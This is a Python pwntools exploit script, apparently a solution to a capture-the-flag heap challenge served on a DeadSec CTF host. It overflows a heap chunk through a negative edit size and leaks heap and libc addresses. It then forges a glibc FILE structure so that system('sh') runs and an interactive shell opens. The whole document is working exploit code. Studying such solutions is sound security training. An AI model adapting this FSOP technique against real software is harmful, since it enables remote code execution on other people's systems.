#!/usr/bin/env python3

from pwn import *

exe = ELF('./prob_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def setfile(data):
	sla(b"> ", b"1")
	sla(b"cpio: ", data)

def editfile(name, size, data):
	sla(b"> ", b"3")
	sla(b"edit: ", name)
	sla(b"size: ", f"{size}".encode())
	sa(b"data: ", data)

def view():
	sla(b"> ", b"2")

def enc(s):
	res = b""
	for e in s:
		if(ord(e) < 0x10):
			res += b"0"
		res += f"{hex(ord(e))}".encode()[2::]
	return res

def note(flag, pad, size_name, size_data, buf):
	payload = flag
	payload += pad * 18
	payload += size_name
	payload += pad * 2
	payload += size_data
	payload += enc(buf)
	return payload

script = '''
# head
brva 0x182D
# strcmp
brva 0x17A8
# fread
brva 0x16DC
# read edit
brva 0x19F0 
'''

#p = remote("0", 31313)
p = remote("nc.deadsec.quest", 31570)
#p = process("./prob_patched")
#p = gdb.debug('./prob_patched', gdbscript = script)

payload = note(b"c771", b"41", b"1700", b"1700", "A" * 0x7)
setfile(payload)

payload = note(b"c771", b"42", b"d701", b"7700", "B" * 0x2c)
setfile(payload)

# leak heap
payload = b"B" * 0x78 + p64(0x31) + p8(0x88)
editfile(b"B" * 0x2c, -1, payload)
view()
p.recvn(0x4b)
s = p.recvn(6)
heap_base = u64(s.ljust(8, b"\x00")) - 0x380
lleak("heap", heap_base)

# leak libc
payload = b"B" * 0x78 + p64(0x31) + p64(heap_base + 0x3e8)
editfile(p64(heap_base + 0x380), -1, payload)
view()
p.recvn(0x4b)
s = p.recvn(6)
libc_base = u64(s.ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stderr_']
lleak("libc", libc_base)

# make fake ptr point to stdout
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
_IO_2_1_stderr_ = libc_base + libc.symbols['_IO_2_1_stderr_']
payload = b"B" * 0x78 + p64(0x31) + p64(heap_base + 0x2520) + p64(_IO_2_1_stdout_)
editfile(p64(_IO_2_1_stderr_), -1, payload)

# fsop
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

#debug()

editfile(b"B" * 0x2c, -1, payload)

p.interactive()